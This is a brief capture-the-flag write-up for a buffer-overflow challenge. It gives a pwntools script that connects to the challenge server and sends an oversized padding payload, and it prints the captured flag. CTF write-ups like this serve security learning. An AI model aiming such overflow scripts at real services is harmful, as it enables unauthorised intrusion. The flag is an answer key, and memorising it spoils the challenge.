# Pwntorial

Looking in the google drive and reading all that we can understand that it is a buffer overflow.
Exploit:
```python
from pwn import *

p=remote("0.cloud.chals.io",19476)

payload=b"A"*64+b"B"*100
p.sendline(payload)

p.interactive()
```

flag: `bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}`